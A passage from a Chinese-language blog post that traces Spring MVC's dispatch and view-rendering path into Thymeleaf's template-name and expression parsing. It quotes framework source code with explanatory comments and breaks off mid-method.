<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915205218.png"><br>这里的handler为ViewNameMethodReturnValueHandler对象，进入handleReturnValue方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据返回值的类型进行处理</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleReturnValue</span><span class="params">(<span class="meta">@Nullable</span> Object returnValue, MethodParameter returnType,</span></span><br><span class="line"><span class="params">        ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 如果返回值是 CharSequence 类型（例如 String），则将其作为视图名称设置到 ModelAndViewContainer 中，并根据视图名称判断是否为重定向视图</span></span><br><span class="line">    <span class="keyword">if</span> (returnValue <span class="keyword">instanceof</span> CharSequence) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">viewName</span> <span class="operator">=</span> returnValue.toString();</span><br><span class="line">        mavContainer.setViewName(viewName);</span><br><span class="line">        <span class="comment">// 如果视图名称以 redirect: 或 forward: 开头，则将重定向标志设置到 ModelAndViewContainer 中</span></span><br><span class="line">        <span class="keyword">if</span> (isRedirectViewName(viewName)) &#123;</span><br><span class="line">            mavContainer.setRedirectModelScenario(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (returnValue != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// should not happen</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Unexpected return type: &quot;</span> +</span><br><span class="line">                returnType.getParameterType().getName() + <span class="string">&quot; in method: &quot;</span> + returnType.getMethod());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>isRedirectViewName方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isRedirectViewName</span><span class="params">(String viewName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (PatternMatchUtils.simpleMatch(<span class="built_in">this</span>.redirectPatterns, viewName) || viewName.startsWith(<span class="string">&quot;redirect:&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915233659.png"><br>回到invokeHandlerMethod方法，执行下面代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);</span><br></pre></td></tr></table></figure>

<p>进入RequestMappingHandlerAdapter.java的getModelAndView方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取处理方法返回的 ModelAndView 对象</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">private</span> ModelAndView <span class="title function_">getModelAndView</span><span class="params">(ModelAndViewContainer mavContainer,</span></span><br><span class="line"><span class="params">        ModelFactory modelFactory, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 更新模型数据</span></span><br><span class="line">    modelFactory.updateModel(webRequest, mavContainer);</span><br><span class="line">    <span class="keyword">if</span> (mavContainer.isRequestHandled()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取模型</span></span><br><span class="line">    <span class="type">ModelMap</span> <span class="variable">model</span> <span class="operator">=</span> mavContainer.getModel();</span><br><span class="line">    <span class="comment">// 创建 ModelAndView 对象，设置视图名称、模型数据和状态码</span></span><br><span class="line">    <span class="type">ModelAndView</span> <span class="variable">mav</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(mavContainer.getViewName(), model, mavContainer.getStatus());</span><br><span class="line">    <span class="keyword">if</span> (!mavContainer.isViewReference()) &#123;</span><br><span class="line">        mav.setView((View) mavContainer.getView());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// // 如果模型数据是 RedirectAttributes 类型，则将 Flash 属性添加到输出 FlashMap 中</span></span><br><span class="line">    <span class="keyword">if</span> (model <span class="keyword">instanceof</span> RedirectAttributes) &#123;</span><br><span class="line">        Map&lt;String, ?&gt; flashAttributes = ((RedirectAttributes) model).getFlashAttributes();</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> webRequest.getNativeRequest(HttpServletRequest.class);</span><br><span class="line">        <span class="keyword">if</span> (request != <span class="literal">null</span>) &#123;</span><br><span class="line">            RequestContextUtils.getOutputFlashMap(request).putAll(flashAttributes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915234508.png"></p>
<p>再次回到doDispatch方法，执行下面代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br></pre></td></tr></table></figure>

<p>进入applyPostHandle</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于在请求处理完成后应用拦截器的 postHandle 方法。这样可以在请求处理的后续阶段对请求进行进一步处理，例如修改响应结果或记录日志等</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">applyPostHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, <span class="meta">@Nullable</span> ModelAndView mv)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    HandlerInterceptor[] interceptors = getInterceptors();</span><br><span class="line">    <span class="keyword">if</span> (!ObjectUtils.isEmpty(interceptors)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> interceptors.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">HandlerInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> interceptors[i];</span><br><span class="line">            interceptor.postHandle(request, response, <span class="built_in">this</span>.handler, mv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>回到doDispatch方法，执行下面代码，进行模板渲染</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br></pre></td></tr></table></figure>

<p>进入processDispatchResult方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于处理请求的分发结果，包括处理方法的执行结果、异常情况以及视图渲染等操作</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processDispatchResult</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> HandlerExecutionChain mappedHandler, <span class="meta">@Nullable</span> ModelAndView mv,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> Exception exception)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">errorView</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 根据异常类型进行处理</span></span><br><span class="line">    <span class="keyword">if</span> (exception != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exception <span class="keyword">instanceof</span> ModelAndViewDefiningException) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;ModelAndViewDefiningException encountered&quot;</span>, exception);</span><br><span class="line">            mv = ((ModelAndViewDefiningException) exception).getModelAndView();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> (mappedHandler != <span class="literal">null</span> ? mappedHandler.getHandler() : <span class="literal">null</span>);</span><br><span class="line">            mv = processHandlerException(request, response, handler, exception);</span><br><span class="line">            errorView = (mv != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the handler return a view to render?</span></span><br><span class="line">    <span class="keyword">if</span> (mv != <span class="literal">null</span> &amp;&amp; !mv.wasCleared()) &#123;</span><br><span class="line">        <span class="comment">// 处理视图  渲染</span></span><br><span class="line">        render(mv, request, response);</span><br><span class="line">        <span class="keyword">if</span> (errorView) &#123;</span><br><span class="line">            WebUtils.clearErrorRequestAttributes(request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">            logger.trace(<span class="string">&quot;No view rendering, null ModelAndView returned.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">        <span class="comment">// Concurrent handling started during a forward</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mappedHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Exception (if any) is already handled..</span></span><br><span class="line">        mappedHandler.triggerAfterCompletion(request, response, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入render方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 确定请求的区域设置，并将其应用于响应</span></span><br><span class="line">    <span class="comment">// Determine locale for request and apply it to the response.</span></span><br><span class="line">    <span class="type">Locale</span> <span class="variable">locale</span> <span class="operator">=</span></span><br><span class="line">            (<span class="built_in">this</span>.localeResolver != <span class="literal">null</span> ? <span class="built_in">this</span>.localeResolver.resolveLocale(request) : request.getLocale());</span><br><span class="line">    response.setLocale(locale);</span><br><span class="line">    <span class="comment">// 获取要渲染的视图对象 view</span></span><br><span class="line">    View view;</span><br><span class="line">    <span class="type">String</span> <span class="variable">viewName</span> <span class="operator">=</span> mv.getViewName();</span><br><span class="line">    <span class="keyword">if</span> (viewName != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 解析视图名称并获取相应的视图对象</span></span><br><span class="line">        <span class="comment">// We need to resolve the view name.</span></span><br><span class="line">        view = resolveViewName(viewName, mv.getModelInternal(), locale, request);</span><br><span class="line">        <span class="keyword">if</span> (view == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;Could not resolve view with name &#x27;&quot;</span> + mv.getViewName() +</span><br><span class="line">                    <span class="string">&quot;&#x27; in servlet with name &#x27;&quot;</span> + getServletName() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// No need to lookup: the ModelAndView object contains the actual View object.</span></span><br><span class="line">        view = mv.getView();</span><br><span class="line">        <span class="keyword">if</span> (view == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;ModelAndView [&quot;</span> + mv + <span class="string">&quot;] neither contains a view name nor a &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;View object in servlet with name &#x27;&quot;</span> + getServletName() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Delegate to the View object for rendering.</span></span><br><span class="line">    <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">        logger.trace(<span class="string">&quot;Rendering view [&quot;</span> + view + <span class="string">&quot;] &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (mv.getStatus() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果 ModelAndView 中定义了状态码，则将其设置到响应中</span></span><br><span class="line">            response.setStatus(mv.getStatus().value());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用视图对象的 render 方法，将模型数据、请求对象和响应对象传递给视图对象进行渲染</span></span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        view.render(mv.getModelInternal(), request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Error rendering view [&quot;</span> + view + <span class="string">&quot;]&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230916145052.png"><br>进入ThymeleafView对象的render方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="built_in">this</span>.renderFragment(<span class="built_in">this</span>.markupSelectors, model, request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入renderFragment方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">renderFragment</span><span class="params">(Set&lt;String&gt; markupSelectorsToRender, Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 获取 ServletContext、视图模板名称（viewTemplateName）和视图模板引擎（viewTemplateEngine）</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line">    <span class="type">String</span> <span class="variable">viewTemplateName</span> <span class="operator">=</span> <span class="built_in">this</span>.getTemplateName();</span><br><span class="line">    <span class="type">ISpringTemplateEngine</span> <span class="variable">viewTemplateEngine</span> <span class="operator">=</span> <span class="built_in">this</span>.getTemplateEngine();</span><br><span class="line">    <span class="keyword">if</span> (viewTemplateName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Property &#x27;templateName&#x27; is required&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getLocale() == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Property &#x27;locale&#x27; is required&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (viewTemplateEngine == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Property &#x27;templateEngine&#x27; is required&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个合并模型（mergedModel），它是一个包含模板静态变量、路径变量和传入的模型数据的 HashMap。合并模型用于在模板渲染过程中访问和使用数据</span></span><br><span class="line">        Map&lt;String, Object&gt; mergedModel = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">30</span>);</span><br><span class="line">        Map&lt;String, Object&gt; templateStaticVariables = <span class="built_in">this</span>.getStaticVariables();</span><br><span class="line">        <span class="keyword">if</span> (templateStaticVariables != <span class="literal">null</span>) &#123;</span><br><span class="line">            mergedModel.putAll(templateStaticVariables);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pathVariablesSelector != <span class="literal">null</span>) &#123;</span><br><span class="line">            Map&lt;String, Object&gt; pathVars = (Map)request.getAttribute(pathVariablesSelector);</span><br><span class="line">            <span class="keyword">if</span> (pathVars != <span class="literal">null</span>) &#123;</span><br><span class="line">                mergedModel.putAll(pathVars);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (model != <span class="literal">null</span>) &#123;</span><br><span class="line">            mergedModel.putAll(model);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 建一个 RequestContext 对象和一个 SpringWebMvcThymeleafRequestContext 对象，并将其添加到合并模型中，</span></span><br><span class="line">        <span class="comment">// 以便在模板中可以使用 Spring MVC 和 Thymeleaf 相关的上下文信息和功能</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> <span class="built_in">this</span>.getApplicationContext();</span><br><span class="line">        <span class="type">RequestContext</span> <span class="variable">requestContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestContext</span>(request, response, <span class="built_in">this</span>.getServletContext(), mergedModel);</span><br><span class="line">        <span class="type">SpringWebMvcThymeleafRequestContext</span> <span class="variable">thymeleafRequestContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpringWebMvcThymeleafRequestContext</span>(requestContext, request);</span><br><span class="line">        addRequestContextAsVariable(mergedModel, <span class="string">&quot;springRequestContext&quot;</span>, requestContext);</span><br><span class="line">        addRequestContextAsVariable(mergedModel, <span class="string">&quot;springMacroRequestContext&quot;</span>, requestContext);</span><br><span class="line">        mergedModel.put(<span class="string">&quot;thymeleafRequestContext&quot;</span>, thymeleafRequestContext);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个 ThymeleafEvaluationContext 对象，并将其添加到合并模型中，以便在模板中可以使用 Thymeleaf 的表达式求值上下文</span></span><br><span class="line">        <span class="type">ConversionService</span> <span class="variable">conversionService</span> <span class="operator">=</span> (ConversionService)request.getAttribute(ConversionService.class.getName());</span><br><span class="line">        <span class="type">ThymeleafEvaluationContext</span> <span class="variable">evaluationContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThymeleafEvaluationContext</span>(applicationContext, conversionService);</span><br><span class="line">        mergedModel.put(<span class="string">&quot;thymeleaf::EvaluationContext&quot;</span>, evaluationContext);</span><br><span class="line">        <span class="type">IEngineConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> viewTemplateEngine.getConfiguration();</span><br><span class="line">        <span class="type">WebExpressionContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebExpressionContext</span>(configuration, request, response, servletContext, <span class="built_in">this</span>.getLocale(), mergedModel);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据视图模板名称解析模板名称和标记选择器</span></span><br><span class="line">        String templateName;</span><br><span class="line">        Set markupSelectors;</span><br><span class="line">        <span class="comment">// 如果视图模板名称不包含 &quot;::&quot; 分隔符，则将整个视图模板名称作为模板名称，标记选择器设置为null</span></span><br><span class="line">        <span class="keyword">if</span> (!viewTemplateName.contains(<span class="string">&quot;::&quot;</span>)) &#123;</span><br><span class="line">            templateName = viewTemplateName;</span><br><span class="line">            markupSelectors = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 否则使用 Thymeleaf 解析器解析视图模板名称，获取模板名称和标记选择器</span></span><br><span class="line">            <span class="type">IStandardExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> StandardExpressions.getExpressionParser(configuration);</span><br><span class="line"></span><br><span class="line">            FragmentExpression fragmentExpression;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fragmentExpression = (FragmentExpression)parser.parseExpression(context, <span class="string">&quot;~&#123;&quot;</span> + viewTemplateName + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (TemplateProcessingException var25) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid template name specification: &#x27;&quot;</span> + viewTemplateName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            FragmentExpression.<span class="type">ExecutedFragmentExpression</span> <span class="variable">fragment</span> <span class="operator">=</span> FragmentExpression.createExecutedFragmentExpression(context, fragmentExpression);</span><br><span class="line">            templateName = FragmentExpression.resolveTemplateName(fragment);</span><br><span class="line">            markupSelectors = FragmentExpression.resolveFragments(fragment);</span><br><span class="line">            Map&lt;String, Object&gt; nameFragmentParameters = fragment.getFragmentParameters();</span><br><span class="line">            <span class="keyword">if</span> (nameFragmentParameters != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fragment.hasSyntheticParameters()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Parameters in a view specification must be named (non-synthetic): &#x27;&quot;</span> + viewTemplateName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                context.setVariables(nameFragmentParameters);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">templateContentType</span> <span class="operator">=</span> <span class="built_in">this</span>.getContentType();</span><br><span class="line">        <span class="type">Locale</span> <span class="variable">templateLocale</span> <span class="operator">=</span> <span class="built_in">this</span>.getLocale();</span><br><span class="line">        <span class="type">String</span> <span class="variable">templateCharacterEncoding</span> <span class="operator">=</span> <span class="built_in">this</span>.getCharacterEncoding();</span><br><span class="line">        Set processMarkupSelectors;</span><br><span class="line">        <span class="keyword">if</span> (markupSelectors != <span class="literal">null</span> &amp;&amp; markupSelectors.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (markupSelectorsToRender != <span class="literal">null</span> &amp;&amp; markupSelectorsToRender.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;A markup selector has been specified (&quot;</span> + Arrays.asList(markupSelectors) + <span class="string">&quot;) for a view that was already being executed as a fragment (&quot;</span> + Arrays.asList(markupSelectorsToRender) + <span class="string">&quot;). Only one fragment selection is allowed.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            processMarkupSelectors = markupSelectors;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (markupSelectorsToRender != <span class="literal">null</span> &amp;&amp; markupSelectorsToRender.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            processMarkupSelectors = markupSelectorsToRender;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            processMarkupSelectors = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 设置响应的区域设置</span></span><br><span class="line">        response.setLocale(templateLocale);</span><br><span class="line">        <span class="comment">// 根据配置和模板设置响应的内容类型（contentType）和字符编码</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.getForceContentType()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">computedContentType</span> <span class="operator">=</span> SpringContentTypeUtils.computeViewContentType(request, templateContentType != <span class="literal">null</span> ? templateContentType : <span class="string">&quot;text/html;charset=ISO-8859-1&quot;</span>, templateCharacterEncoding != <span class="literal">null</span> ? Charset.forName(templateCharacterEncoding) : <span class="literal">null</span>);</span><br><span class="line">            response.setContentType(computedContentType);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (templateContentType != <span class="literal">null</span>) &#123;</span><br><span class="line">                response.setContentType(templateContentType);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html;charset=ISO-8859-1&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (templateCharacterEncoding != <span class="literal">null</span>) &#123;</span><br><span class="line">                response.setCharacterEncoding(templateCharacterEncoding);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">producePartialOutputWhileProcessing</span> <span class="operator">=</span> <span class="built_in">this</span>.getProducePartialOutputWhileProcessing();</span><br><span class="line">        <span class="comment">// 根据配置决定是否在处理过程中生成部分输出。如果生成部分输出，则使用响应的 Writer 对象，否则创建一个 FastStringWriter 对象作为模板的输出</span></span><br><span class="line">        <span class="type">Writer</span> <span class="variable">templateWriter</span> <span class="operator">=</span> producePartialOutputWhileProcessing ? response.getWriter() : <span class="keyword">new</span> <span class="title class_">FastStringWriter</span>(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用视图模板引擎的 process 方法渲染模板。传入模板名称、标记选择器、表达式上下文和输出 Writer</span></span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        viewTemplateEngine.process(templateName, processMarkupSelectors, context, (Writer)templateWriter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果生成部分输出，则将部分输出写入响应的 Writer 中；否则，将模板渲染结果作为字符串写入响应的 Writer 中。</span></span><br><span class="line">        <span class="keyword">if</span> (!producePartialOutputWhileProcessing) &#123;</span><br><span class="line">            response.getWriter().write(templateWriter.toString());</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于传入的模板名包含<code>::</code>，所以会使用Thymeleaf 解析器解析视图模板名称<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230916151138.png"><br>进入StandardExpressionParser的parseExpression方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Expression <span class="title function_">parseExpression</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> IExpressionContext context,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> String input)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    Validate.notNull(context, <span class="string">&quot;Context cannot be null&quot;</span>);</span><br><span class="line">    Validate.notNull(input, <span class="string">&quot;Input cannot be null&quot;</span>);</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">return</span> (Expression) parseExpression(context, input, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入parseExpression<br>这个用于解析表达式的方法。它通过对输入字符串进行预处理，并利用 Thymeleaf 的 Expression 类来解析表达式。解析后的表达式对象会被缓存，以提高性能并避免重复解析相同的表达式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> IStandardExpression <span class="title function_">parseExpression</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> IExpressionContext context,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> String input, <span class="keyword">final</span> <span class="type">boolean</span> preprocess)</span> &#123;</span><br><span class="line">    <span class="comment">// 从上下文中获取引擎配置</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">IEngineConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> context.getConfiguration();</span><br><span class="line">    <span class="comment">// 根据 preprocess 参数的值，决定是否对输入字符串进行预处理</span></span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">preprocessedInput</span> <span class="operator">=</span></span><br><span class="line">        (preprocess? StandardExpressionPreprocessor.preprocess(context, input) : input);</span><br><span class="line">    <span class="comment">// 从表达式缓存中尝试获取已缓存的表达式对象</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">IStandardExpression</span> <span class="variable">cachedExpression</span> <span class="operator">=</span></span><br><span class="line">            ExpressionCache.getExpressionFromCache(configuration, preprocessedInput);</span><br><span class="line">    <span class="keyword">if</span> (cachedExpression != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> cachedExpression;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有找到已缓存的表达式对象，则调用 Expression 类的 parse 方法解析预处理后的字符串，得到表达式对象</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> Expression.parse(preprocessedInput.trim());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (expression == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span 